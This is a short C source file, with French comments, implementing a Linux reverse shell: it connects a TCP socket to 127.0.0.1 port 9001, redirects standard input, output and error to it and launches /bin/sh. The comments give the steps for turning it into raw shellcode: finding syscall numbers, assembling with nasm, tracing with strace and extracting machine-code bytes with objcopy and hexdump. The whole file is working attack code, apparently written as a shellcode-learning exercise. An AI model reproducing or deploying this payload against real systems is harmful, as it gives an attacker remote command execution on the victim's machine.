#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>


// Trouver les syscall dans /usr/include/asm/unistd_64.h
// #define __NR_socket 41
// #define __NR_connect 42
// #define __NR_dup2 33
// #define __NR_execve 59
// Ou utiliser ausyscall execve

// Trouver les code pour les params
// python -c 'import socket; print socket.SOCK_STREAM'
// python -c 'import socket; print socket.AF_INET'


// une fois le code assembleur ecrit
// nasm -f elf64 -o RevShellLinux.o RevShellLinux.nasm
// ld -o RevShellLinux RevShellLinux.o

// On test avec strace
// strace ./RevShellLinux
// -> execve("./RevShellLinux", ["./RevShellLinux"], 0x7ffc777bc360 /* 98 vars */) = 0
// -> socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3

// objdump -d -M intel RevShellLinux

// Pour avoir le code machine executable
// objcopy -O binary RevShellLinux RevShellLinux.bin
// hexdump -v -e '"\\""x" 1/1 "%02x" ""' RevShellLinux.bin


int main()
{
	int sockfd;
	int port=9001;

	// address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	// socket syscall
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// connect syscall
	connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

	// Dup syscall
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// Execve syscall
	execve("/bin/sh", NULL, NULL);

	return 0;
}
